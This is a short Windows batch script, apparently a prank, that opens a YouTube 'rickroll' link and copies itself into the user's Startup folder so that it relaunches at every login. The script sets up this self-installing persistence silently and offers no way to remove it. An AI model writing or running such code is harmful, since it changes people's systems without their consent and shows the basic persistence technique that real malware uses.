@echo off

if exist "%userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/%~n0%~x0" (
start "" https://youtube.com/watch?v=dQw4w9WgXcQ
pause

) else (
copy /y %~f0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
start "" https://youtube.com/watch?v=dQw4w9WgXcQ
)
cls